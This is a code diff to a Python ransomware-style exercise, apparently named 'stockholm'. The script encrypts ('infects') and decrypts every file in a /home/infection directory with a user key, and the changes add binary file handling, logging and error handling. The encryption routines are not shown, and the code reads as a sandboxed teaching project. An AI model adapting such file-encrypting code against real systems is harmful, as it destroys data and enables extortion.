@@ -8,9 +8,9 @@ INFECTION_DIR = "/home/infection"
 MINIMUM_KEY_LEN=16
 
 def infect_file(key, path):
-	print(f"Infecting {path}")
+	log(f"Infecting {path}")
 	encrypted = ""
-	with open(path, 'r') as file:
+	with open(path, 'rb') as file:
 		content = file.read()
 		encrypted = ft_encrypt(key, content)
 	
@@ -18,27 +18,32 @@ def infect_file(key, path):
 		file.write(encrypted)
 
 def reverse_file(key, path):
-	print(f"Reversing {path}")
+	log(f"Reversing {path}")
 	content = ""
 	with open(path, 'rb') as file:
 		encrypted = file.read()
 		content = ft_decrypt(key, encrypted)
-		print(f"Decrypted content:{content}")
 	
-	with open(path, 'w') as file:
+	with open(path, 'wb') as file:
 		file.write(content)
 	
 def infect_directory(key, directory):
 	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]
 
 	for f in files:
-		infect_file(key, f)
+		try:
+			infect_file(key, f)
+		except Exception:
+			log("Error: Decryption failed")
 
 def reverse_directory(key, directory):
 	files = [join(directory, f) for f in os.listdir(directory) if isfile(join(directory, f))]
 
 	for f in files:
-		reverse_file(key, f)
+		try:
+			reverse_file(key, f)
+		except Exception:
+			log("Error: Decryption failed")
 
 def key_is_valid(key):
 	return len(key) >= MINIMUM_KEY_LEN
@@ -52,11 +57,6 @@ def stockholm(args):
 
 	if not os.path.exists(INFECTION_DIR):
 		raise ValueError("Target directory \'/home/infection\' does not exist.")
-
-	if args.silent:
-		print("Silent mode enabled")
-
-	log(f"Key: {args.key}")
 
 	if args.reverse:
 		log("Reverse mode enabled")
